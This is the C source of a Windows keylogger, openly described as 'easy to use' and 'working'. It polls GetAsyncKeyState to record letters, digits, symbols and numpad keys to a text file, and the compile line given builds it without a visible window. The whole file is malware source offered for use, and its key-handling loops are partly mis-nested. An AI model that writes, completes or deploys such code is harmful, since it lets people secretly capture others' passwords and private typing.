#include <windows.h>
#include <stdio.h>
#include <ctype.h>
#include <unistd.h>

//Easy to use working Windows keylogger using the Win32 API.
// Compile: gcc -o keylogger keylogger.c -lws2_32 -mwindows
// Run: keylogger.exe


int main() {


    SHORT character;
    char *filefrfr;
    char *filepath = "YOUR PATH HERE\\keylog.txt";


    int specialKeys[] = {49, 50, 51, 52, 53, 54, 55, 56, 57, 48, VK_OEM_1, VK_OEM_PLUS, VK_OEM_COMMA, VK_OEM_MINUS, VK_OEM_PERIOD, VK_OEM_2, VK_OEM_3, VK_OEM_4, VK_OEM_5, VK_OEM_6, VK_OEM_7};
    char specialChars[] = {'!', '@', '#', '$', '%', '^', '&', '*', '(', ')', ':', '+', '<', '_', '>', '?', '~', '{', '|', '}', '"'};
    int numSpecialKeys = sizeof(specialKeys) / sizeof(int);
    
    
    int noshiftSpecialKeys[] = {VK_OEM_1, VK_OEM_PLUS, VK_OEM_COMMA, VK_OEM_MINUS, VK_OEM_PERIOD, VK_OEM_2, VK_OEM_3, VK_OEM_4, VK_OEM_5, VK_OEM_6, VK_OEM_7};
    char noshiftSpecialChars[] = {';', '=', ',', '-', '.', '/', '`', '[', '\\', ']', '\''};
    int numnoshiftSpecialKeys = sizeof(noshiftSpecialKeys) / sizeof(int);



    int numKeys[] = {48, 49, 50, 51, 52, 53, 54, 55, 56, 57};
    char numChars[] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};
    int numnumKeys = sizeof(numKeys) / sizeof(int);

    int numpadKeys[] = {VK_NUMPAD0, VK_NUMPAD1, VK_NUMPAD2, VK_NUMPAD3, VK_NUMPAD4, VK_NUMPAD5, VK_NUMPAD6, VK_NUMPAD7, VK_NUMPAD8, VK_NUMPAD9};
    char numpadChars[] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};
    int numnumpadKeys = sizeof(numpadKeys) / sizeof(int);



if (access(filepath, F_OK) != -1) {
    filefrfr = "a";
} else {
    filefrfr = "w";
}

FILE* file = fopen(filepath, filefrfr);
if (file == NULL) {
    printf("Error opening file!\n");
    return 1;
}

while (1) {

    for (character = 65; character <= 90; character++) {
        if (GetAsyncKeyState(character) & 0x8000) {
            if ((GetKeyState(VK_CAPITAL) & 0x0001) && GetAsyncKeyState(VK_SHIFT)) {
                fprintf(file, "%c", character + 32);
                printf("%c", character + 32);
            } else if (GetAsyncKeyState(VK_SHIFT) || (GetKeyState(VK_CAPITAL) & 0x0001)) {
                fprintf(file, "%c", character);
                printf("%c", character);
            } else {
                fprintf(file, "%c", character + 32);
                printf("%c", character + 32);
            }
            Sleep(100);
        }
    }

    for (int i = 0; i < numSpecialKeys; i++) {
        if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
            if (GetAsyncKeyState(specialKeys[i]) & 0x8000) {
                fprintf(file, "%c", specialChars[i]);
                printf("%c", specialChars[i]);
                fflush(file);
                Sleep(120);
            } else {
                continue;
            }
        }

        for (int i = 0; i < numnumKeys; i++) {
            if (GetAsyncKeyState(numKeys[i]) & 0x8000) {
                fprintf(file, "%c", numChars[i]);
                printf("%c", numChars[i]);
                fflush(file);
                Sleep(120);
            }
        }

        for (int i = 0; i < numnoshiftSpecialKeys; i++) {
            if (GetAsyncKeyState(noshiftSpecialKeys[i]) & 0x8000) {
                fprintf(file, "%c", noshiftSpecialChars[i]);
                printf("%c", noshiftSpecialChars[i]);
                fflush(file);
                Sleep(120);
            }
        }
        if (GetAsyncKeyState(VK_SPACE) & 0x8000) {
            fprintf(file, "%c", ' ');
            printf("%c", ' ');
            fflush(file);
            Sleep(120);
        }

        for (int i = 0; i < numnumpadKeys; i++) {
            if (GetAsyncKeyState(numpadKeys[i]) & 0x8000) {
                fprintf(file, "%c", numpadChars[i]);
                printf("%c", numpadChars[i]);
                fflush(file);
                Sleep(120);
            }
        }
    }
}
return 0;
}






